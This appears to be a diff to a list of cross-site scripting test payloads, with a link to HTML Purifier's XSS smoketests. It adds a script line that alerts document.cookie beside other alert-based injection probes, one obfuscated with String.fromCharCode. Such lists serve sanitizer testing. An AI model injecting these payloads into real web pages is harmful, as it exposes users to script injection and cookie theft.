@@ -1,6 +1,7 @@
 More : http://htmlpurifier.org/live/smoketests/xssAttacks.php
 
 <script>alert(123);</script>
+<script>alert(document.cookie);</script>
 <script>alert("XSS");</script>
 <script>alert("XSS_A_MAHMUD");</script>
 <script>alert(String.fromCharCode(88,83,83))</script>
